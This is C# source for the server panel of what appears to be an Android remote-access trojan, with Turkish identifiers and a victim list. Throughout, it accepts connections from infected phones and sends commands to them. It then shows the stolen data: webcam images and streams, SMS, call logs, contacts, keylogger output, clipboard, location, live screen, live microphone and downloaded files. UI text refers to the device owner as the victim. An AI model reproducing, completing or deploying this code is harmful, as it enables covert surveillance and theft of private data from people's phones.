using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SV
{
    public partial class Form1 : Form
    {
        List<Kurbanlar> kurban_listesi = new List<Kurbanlar>();
        Socket soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            if (new Port().ShowDialog() == DialogResult.OK)
            {
                Dinle();
            }
            else
            {
                Environment.Exit(0);
            }
        }
        public static int port_no = 9999;
        public static string PASSWORD = string.Empty;
        public void Dinle()
        {
            try
            {
                soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //soketimiz.NoDelay = true;
                soketimiz.SendBufferSize = 524288; soketimiz.ReceiveBufferSize = 524288;
                soketimiz.SendTimeout = -1; soketimiz.ReceiveTimeout = -1;
                soketimiz.Bind(new IPEndPoint(IPAddress.Any, port_no));
                toolStripStatusLabel1.Text = "Port: " + port_no.ToString();
                soketimiz.Listen(int.MaxValue);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public async void infoAl(Socket sckInf)
        {
            if (!sckInf.Connected)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " couldn't connect."); return;
            }
            if (sckInf.Poll(-1, SelectMode.SelectRead) && sckInf.Available <= 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " ghost connection: Poll");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            if (sckInf.Available == 0)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                " the socket is not ready: [ghost connection]");
                sckInf.Disconnect(false);
                sckInf.Close();
                sckInf.Dispose();
                return;
            }
            NetworkStream networkStream = new NetworkStream(sckInf);

            if (!networkStream.CanRead)
            {
                listBox1.Items.Add(sckInf.Handle.ToString() +
                    " networkstream couldn't read."); sckInf.Dispose(); return;
            }

            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + sckInf.Handle.ToString() +
                    " networkstream have started.");

            StringBuilder sb = new StringBuilder();
            int thisRead = 0;
            int blockSize = 2048;
            byte[] dataByte = new byte[blockSize];
            while (true)
            {
                try
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    sb.Append(Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    while (sb.ToString().Trim().Contains($"<EOF{PASSWORD}>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                        DataInvoke(sckInf, veri.Replace($"<EOF{PASSWORD}>", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf($"<EOF{PASSWORD}>") + $"<EOF{PASSWORD}>".Length);
                    }
                }
                catch (Exception)
                {
                    break;
                }
            }
        }
        public static async void KomutGonder(string tag, string mesaj, Socket client)
        {
            try
            {
                using (NetworkStream ns = new NetworkStream(client))
                {
                    byte[] cmd = Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + "<EOF>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }
            }
            catch (Exception) { }
        }
        public void Client_Kabul(IAsyncResult ar)
        {
            try
            {
                Socket sock = soketimiz.EndAccept(ar);
                infoAl(sock);
                soketimiz.BeginAccept(new AsyncCallback(Client_Kabul), null);
            }
            catch (Exception) { }
        }
        public static int topOf = 0;
        public async void Ekle(Socket socettte, string idimiz, string makine_ismi,
            string ulke_dil, string uretici_model, string android_ver)
        {
            //socettte.NoDelay = true;
            //socettte.ReceiveBufferSize = int.MaxValue; socettte.SendBufferSize = int.MaxValue;
            kurban_listesi.Add(new Kurbanlar(socettte, idimiz));
            ListViewItem lvi = new ListViewItem(idimiz);
            lvi.SubItems.Add(makine_ismi);
            lvi.SubItems.Add(socettte.RemoteEndPoint.ToString());
            lvi.SubItems.Add(ulke_dil);
            lvi.SubItems.Add(uretici_model.ToUpper());
            lvi.SubItems.Add(android_ver);

            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"))
            {
                lvi.ImageKey = ulke_dil.Split('/')[1].Replace("en", "england") + ".png";
            }
            else
            {
                lvi.ImageIndex = 0;
            }
            listView1.Items.Add(lvi);
            if (File.Exists(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png"))
            {
                new Bildiri(makine_ismi, uretici_model, android_ver,
                Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\" + ulke_dil.Split('/')[1].Replace("en", "england") + ".png")).Show();
            }
            else
            {
                new Bildiri(makine_ismi, uretici_model, android_ver, Image.FromFile(Environment.CurrentDirectory + "\\Klasörler\\Bayraklar\\-1.png")).Show();
            }
            toolStripStatusLabel2.Text = "Online: " + listView1.Items.Count.ToString();
            listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + socettte.Handle.ToString() +
                        " socket in list. => " + makine_ismi + "/" + socettte.RemoteEndPoint.ToString());
            await Task.Delay(1);
            topOf += 125;

        }
        public static RotateFlipType rotateFlip = RotateFlipType.Rotate270FlipX;
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(rotateFlip);
            return bmp;
        }
        public void DataInvoke(Socket soket2, string data)
        {
            string[] ayir = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in ayir)
            {
                string[] s = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {
                    switch (s[0])
                    {
                        case "IP":
                            Invoke((MethodInvoker)delegate
                            {
                                Ekle(soket2, soket2.Handle.ToString(), s[1], s[2], s[3], s[4]);
                            });
                            break;
                        case "CAMREADY":
                            if (FİndKameraById(soket2.Handle.ToString()) != null)
                            {
                                var _shortcam_ = FİndKameraById(soket2.Handle.ToString());
                                _shortcam_.button4.Text = "Start"; _shortcam_.button4.Enabled = true;
                                ((Control)_shortcam_.tabControl1.TabPages[0]).Enabled = true;
                                _shortcam_.enabled = false; _shortcam_.label10.Text = "Fps: 0";
                            }
                            break;
                        case "VID":
                            var shortcam = FİndKameraById(soket2.Handle.ToString());
                            try
                            {
                                if (shortcam != null)
                                {
                                    shortcam.pictureBox2.Image = RotateImage((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                                    shortcam.label10.Text = "Fps: " + shortcam.CalculateFrameRate().ToString();
                                }
                            }
                            catch (Exception ex)
                            {
                                if (shortcam != null)
                                {
                                    FİndKameraById(soket2.Handle.ToString()).Text = ex.Message;
                                }
                            }
                            break;
                        case "SHORTCUT":
                            Eglence eglnc = FindEglenceById(soket2.Handle.ToString());
                            if (eglnc == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    eglnc = new Eglence(soket2, soket2.Handle.ToString());
                                    eglnc.Show();
                                });
                            }
                            MessageBox.Show(eglnc, s[1], "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            break;
                        case "OLCULER":
                            Invoke((MethodInvoker)delegate
                            {
                                if (s[1].Contains("Kameraya"))
                                {
                                    MessageBox.Show(this, s[1] + "\nThis error causes when camera is used by victim.", "Can't access to Camera", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                                else
                                {
                                    if (FİndKameraById(soket2.Handle.ToString()) == null)
                                    {
                                        Kamera msj = new Kamera(soket2, soket2.Handle.ToString());
                                        msj.Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                        msj.Show();
                                    }
                                    FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.Clear();
                                    FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.Clear();
                                    string[] front = s[1].Split('>');
                                    string[] _split = front[1].Split('<');
                                    FİndKameraById(soket2.Handle.ToString()).max = int.Parse(s[2].Split('}')[1]);
                                    FİndKameraById(soket2.Handle.ToString()).comboBox1.Items.AddRange(_split);
                                    _split = front[0].Split('<');
                                    FİndKameraById(soket2.Handle.ToString()).comboBox2.Items.AddRange(_split);
                                    var found = FİndKameraById(soket2.Handle.ToString());
                                    found.zoomSupport = Convert.ToBoolean(s[2].Split('}')[0]);

                                    string[] presize = s[3].Split('<'); found.comboBox4.Items.AddRange(presize);
                                    string[] cams = s[4].Split('!'); for (int p = 0; p < cams.Length; p++)
                                    {
                                        cams[p] = cams[p].Replace("0", "Back: 0").Replace("1", "Front: 1");
                                    }
                                    found.comboBox6.Items.AddRange(cams);
                                    found.comboBox6.SelectedIndex = 0;
                                    foreach (string str_ in found.comboBox1.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox1.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (string str_ in found.comboBox2.Items)
                                    {
                                        if (int.Parse(str_.Split('x')[0]) < 800 && int.Parse(str_.Split('x')[0]) > 500)
                                        {
                                            found.comboBox2.SelectedItem = str_; break;
                                        }
                                    }
                                    foreach (object str_ in found.comboBox4.Items)
                                    {
                                        if (str_.ToString().Contains("352"))
                                        {
                                            found.comboBox4.SelectedItem = str_;
                                        }
                                    }
                                    found.comboBox3.SelectedItem = "%70";
                                }
                            });
                            break;
                        case "CAMNOT":
                            var fnd = FİndKameraById(soket2.Handle.ToString());
                            if (fnd != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    if (s[1] == "")
                                    {
                                        FİndKameraById(soket2.Handle.ToString()).label2.Text = "Couldn't capture.";
                                    }
                                    FİndKameraById(soket2.Handle.ToString()).label1.Visible = true;
                                    FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((Control)fnd.tabPage1).Enabled = true;
                                    ((Control)fnd.tabPage2).Enabled = true;
                                    fnd.enabled = false;
                                    fnd.button4.Text = "Start";
                                    fnd.button4.Enabled = true;
                                });
                                if (s[1] != "" && s[1] != "vid")
                                {
                                    MessageBox.Show(fnd, s[1], "Warning - Camera Preview Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                                }
                            }
                            break;
                        case "SMSLOGU":
                            if (FindSMSFormById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    SMSYoneticisi sMS = new SMSYoneticisi(soket2, soket2.Handle.ToString());
                                    sMS.Text = "SMS Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindSMSFormById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "CAGRIKAYITLARI":
                            if (FindCagriById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    CagriKayitlari sMS = new CagriKayitlari(soket2, soket2.Handle.ToString());
                                    sMS.Text = "Call Logs - " + krbnIsminiBul(soket2.Handle.ToString()); ;
                                    sMS.Show();
                                });
                            }
                            FindCagriById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "REHBER":
                            if (FindRehberById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Rehber sMS = new Rehber(soket2, soket2.Handle.ToString());
                                    sMS.Text = "Adress Book - " + krbnIsminiBul(soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindRehberById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "APPS":
                            if (FindUygulamalarById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Uygulamalar eglence = new Uygulamalar(soket2, soket2.Handle.ToString());
                                    eglence.Text = "Installed Apps - " + krbnIsminiBul(soket2.Handle.ToString());
                                    eglence.Show();
                                });
                            }
                            FindUygulamalarById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "DOSYAALINDI":
                            if (FindFileManagerById(soket2.Handle.ToString()) != null)
                            {
                                FindFileManagerById(soket2.Handle.ToString()).toolStripProgressBar1.Style = ProgressBarStyle.Blocks; FindFileManagerById(soket2.Handle.ToString()).toolStripStatusLabel1.Text = "...";
                                FindFileManagerById(soket2.Handle.ToString()).Text = "File Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "File has been successfully received.", s[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            else
                            {
                                MessageBox.Show(this, "File has been successfully received.", s[1], MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            break;
                        case "WEBCAM":
                            if (FİndKameraById(soket2.Handle.ToString()) != null)
                            {
                                try
                                {

                                    FİndKameraById(soket2.Handle.ToString()).label2.Text = "Captured.";
                                    byte[] resim = Convert.FromBase64String(s[1]);
                                    using (MemoryStream ms = new MemoryStream(resim))
                                    {
                                        FİndKameraById(soket2.Handle.ToString()).pictureBox1.Image = Image.FromStream(ms);
                                    }
                                    FİndKameraById(soket2.Handle.ToString()).button1.Enabled = true;
                                    ((Control)FİndKameraById(soket2.Handle.ToString()).tabPage2).Enabled = true;
                                }
                                catch (Exception ex)
                                {
                                    MessageBox.Show(FİndKameraById(soket2.Handle.ToString()), ex.Message, "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                    FİndKameraById(soket2.Handle.ToString()).Text = "Camera Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                }
                            }
                            break;
                        case "FILES":
                            if (FindFileManagerById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    fmanger = new FİleManager(soket2, soket2.Handle.ToString());
                                    fmanger.Text = "File Manager - " + krbnIsminiBul(soket2.Handle.ToString());
                                    fmanger.Show();
                                });
                            }
                            FindFileManagerById(soket2.Handle.ToString()).bilgileriIsle(s[1], s[2]);
                            break;
                        case "PREVIEW":
                            if (FindFileManagerById(soket2.Handle.ToString()) != null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Image =
                                       (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                    FindFileManagerById(soket2.Handle.ToString()).pictureBox1.Visible = true;
                                });
                            }
                            break;
                        case "UZUNLUK":
                            var fman = FindFileManagerById(soket2.Handle.ToString());
                            string dosyaAdi = s[2];
                            if (!Directory.Exists(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]))
                            {
                                Directory.CreateDirectory(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3]);
                            }
                            try
                            {
                                File.WriteAllBytes(Environment.CurrentDirectory + "\\Klasörler\\İndirilenler\\" + s[3] + "\\"
                                    + s[2], Convert.FromBase64String(s[1]));
                            }
                            catch (Exception ex)
                            {
                                if (fman != null)
                                {
                                    MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), ex.Message, "Download Warning " + krbnIsminiBul(soket2.Handle.ToString()), MessageBoxButtons.OK, MessageBoxIcon.Warning);
                                }
                            }
                            if (fmanger != null)
                            {
                                FindFileManagerById(soket2.Handle.ToString()).toolStripProgressBar1.Style = ProgressBarStyle.Blocks; FindFileManagerById(soket2.Handle.ToString()).toolStripStatusLabel1.Text = "...";
                                FindFileManagerById(soket2.Handle.ToString()).Text = "File Manager - " + krbnIsminiBul(soket2.Handle.ToString()); ;
                                MessageBox.Show(FindFileManagerById(soket2.Handle.ToString()), "File Downloaded", "File downloaded successfully", MessageBoxButtons.OK,
                                    MessageBoxIcon.Information);
                            }
                            break;
                        case "CHAR":
                            try
                            {
                                FindKeyloggerManagerById(soket2.Handle.ToString()).textBox1.Text += s[1].Replace("[NEW_LINE]", Environment.NewLine)
                            + Environment.NewLine;
                            }
                            catch (Exception) { }
                            break;
                        case "LOGDOSYA":
                            try
                            {
                                if (FindKeyloggerManagerById(soket2.Handle.ToString()) == null)
                                {
                                    Invoke((MethodInvoker)delegate
                                    {
                                        Keylogger keylog = new Keylogger(soket2, soket2.Handle.ToString());
                                        keylog.Text = "Keylogger - " + krbnIsminiBul(soket2.Handle.ToString());
                                        keylog.Show();
                                    });
                                }
                                if (s[1] == "LOG_YOK")
                                {
                                    FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add("No logs.");
                                }
                                else
                                {
                                    string ok = s[1];
                                    string[] ayristir = ok.Split('=');
                                    for (int i = 0; i < ayristir.Length; i++)
                                    {
                                        FindKeyloggerManagerById(soket2.Handle.ToString()).comboBox1.Items.Add(ayristir[i]);
                                    }
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "KEYGONDER":
                            string ok_ = s[1];
                            FindKeyloggerManagerById(soket2.Handle.ToString()).textBox2.Text = ok_.Replace("[NEW_LINE]", Environment.NewLine);
                            break;
                        case "SESBILGILERI":
                            if (FindAyarlarById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Ayarlar sMS = new Ayarlar(soket2, soket2.Handle.ToString());
                                    sMS.Text = "Settings - " + krbnIsminiBul(soket2.Handle.ToString());
                                    sMS.Show();
                                });
                            }
                            FindAyarlarById(soket2.Handle.ToString()).bilgileriIsle(s[1]);
                            break;
                        case "TELEFONBILGI":
                            if (FindBilgiById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Bilgiler eglence = new Bilgiler(soket2, soket2.Handle.ToString());
                                    eglence.Text = "Infos - " + krbnIsminiBul(soket2.Handle.ToString());
                                    eglence.Show();
                                });
                            }
                            var shorted = FindBilgiById(soket2.Handle.ToString());
                            shorted.bilgileriIsle(s[1], s[2], s[3], s[6], s[5], s[7], s[8], s[9]);
                            break;
                        case "PANOGELDI":
                            try
                            {
                                if (FindTelephonFormById(soket2.Handle.ToString()) != null)
                                {
                                    string icerik = s[1];
                                    if (icerik != "[NULL]")
                                    {
                                        FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = icerik;
                                    }
                                    else
                                    {
                                        FindTelephonFormById(soket2.Handle.ToString()).textBox4.Text = string.Empty;
                                    }
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "WALLPAPERBYTES":
                            try
                            {
                                if (FindTelephonFormById(soket2.Handle.ToString()) != null)
                                {
                                    FindTelephonFormById(soket2.Handle.ToString()).label4.Text = "Screen Resolution\n" + s[2];
                                    FindTelephonFormById(soket2.Handle.ToString()).pictureBox1.Image
                                   = (Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1]));
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "LOCATION":
                            if (FindKonumById(soket2.Handle.ToString()) == null)
                            {
                                Invoke((MethodInvoker)delegate
                                {
                                    Konum knm = new Konum(soket2, soket2.Handle.ToString());
                                    knm.Text = "Location - " + krbnIsminiBul(soket2.Handle.ToString());
                                    knm.Show();
                                });
                            }
                            FindKonumById(soket2.Handle.ToString()).richTextBox1.Text = string.Empty;
                            string[] ayr = s[1].Split('=');
                            for (int i = 0; i < ayr.Length; i++)
                            {
                                if (ayr[i].Contains("{"))
                                {
                                    string[] url = ayr[i].Split('{');
                                    ayr[i] = $"http://maps.google.com/maps?q={url[0].Replace(','.ToString(), '.'.ToString())},{url[1].Replace(','.ToString(), '.'.ToString())}";
                                }
                                FindKonumById(soket2.Handle.ToString()).richTextBox1.Text += ayr[i] + Environment.NewLine;
                            }
                            break;
                        case "ARAMA":
                            try
                            {
                                ListViewItem lvi = listView1.Items.Cast<ListViewItem>().Where(items => items.Text ==
                                soket2.Handle.ToString()).First();
                                Invoke((MethodInvoker)delegate
                                {
                                    new YeniArama(s[1].Split('=')[1], s[1].Split('=')[0], lvi.SubItems[1].Text + "@" + soket2.RemoteEndPoint.ToString(), soket2.Handle.ToString()).Show();
                                });
                            }
                            catch (Exception) { }
                            break;
                        case "INDIRILDI":
                            try
                            {
                                var window = FindDownloadManagerById(soket2.Handle.ToString());
                                if (window != null)
                                {
                                    MessageBox.Show(window, s[1], "Status of Download", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                }
                                else
                                {
                                    MessageBox.Show(s[1], "Status of Download", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                }
                            }
                            catch (Exception) { }
                            break;
                        case "RECSMS":
                            Invoke((MethodInvoker)delegate
                            {
                                smsgeldi smsgeldi = new smsgeldi(s[1] + "/" + s[2], s[3], s[4]);
                                smsgeldi.Text = "New SMS! - " + krbnIsminiBul(soket2.Handle.ToString());
                                smsgeldi.Show();
                            });
                            break;
                        case "WALLERROR":
                            var _phone_ = FindTelephonFormById(soket2.Handle.ToString());
                            if (_phone_ != null)
                            {
                                MessageBox.Show(_phone_, s[1], "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            }
                            break;
                        case "LIVESCREEN":
                            var canliekran = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran != null)
                            {
                                canliekran.pictureBox1.Image = ((Image)new ImageConverter().ConvertFrom(Convert.FromBase64String(s[1])));
                            }
                            else
                            {
                                KomutGonder("SCREENLIVECLOSE", "[VERI][0x09]", soket2);
                            }
                            break;
                        case "NOTSTART":
                            var canliekran_ = FindLiveScreenById(soket2.Handle.ToString());
                            if (canliekran_ != null)
                            {
                                MessageBox.Show(canliekran_, "Victim has ignored the screen share dialog.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                canliekran_.Close();
                            }
                            break;
                        case "NOCAMERA":
                            MessageBox.Show(this, "The target device doesn't have any camera.", "No Camera", MessageBoxButtons.OK, MessageBoxIcon.Warning);
                            break;
                    }
                }
                catch (Exception) { }
            }
        }
        FİleManager fmanger;
        private void mesajYollaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("CAMHAZIRLA", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void bağlantıyıKapatToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("DOSYA", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void masaustuİzleToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Telefon tlf = new Telefon(kurban.soket, kurban.id);
                        tlf.Text = "Phone - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        tlf.Show();
                    }
                }
            }
        }
        private void canlıMikrofonToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Mikrofon masaustu = new Mikrofon(kurban.soket);
                        masaustu.Text = "Live Microphone - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        masaustu.Show();
                    }
                }
            }
        }
        private void keyloggerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("LOGLARIHAZIRLA", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }
        public int FindAramaCount(string ident)
        {
            var list = Application.OpenForms
          .OfType<YeniArama>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.Count();
        }
        public livescreen FindLiveScreenById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<livescreen>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Telefon FindTelephonFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Telefon>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Rehber FindRehberById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Rehber>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public SMSYoneticisi FindSMSFormById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<SMSYoneticisi>()
              .Where(form => string.Equals(form.uniq_id, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public FİleManager FindFileManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<FİleManager>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Keylogger FindKeyloggerManagerById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Keylogger>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Kamera FİndKameraById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Kamera>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public CagriKayitlari FindCagriById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<CagriKayitlari>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Ayarlar FindAyarlarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Ayarlar>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Uygulamalar FindUygulamalarById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Uygulamalar>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Bilgiler FindBilgiById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Bilgiler>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Konum FindKonumById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Konum>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public Eglence FindEglenceById(string ident)
        {
            try
            {
                var list = Application.OpenForms
              .OfType<Eglence>()
              .Where(form => string.Equals(form.ID, ident))
               .ToList();
                return list.First();
            }
            catch (Exception) { return null; }
        }
        public DownloadManager FindDownloadManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<DownloadManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        private void sMSYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("GELENKUTUSU", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
        private void çağrıKayıtlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("CALLLOGS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void telefonAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("VOLUMELEVELS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void rehberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("REHBERIVER", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void eğlencePaneliToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Eglence eglence = new Eglence(kurban.soket, kurban.id);
                        eglence.Text = "Fun Panel - " + krbnIsminiBul(kurban.soket.Handle.ToString());
                        eglence.Show();
                    }
                }
            }
        }
        private void uygulamaListesiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("APPLICATIONS", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }

        private void telefonDurumuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        KomutGonder("SARJ", "[VERI][0x09]", kurban.soket);
                    }
                }
            }
        }
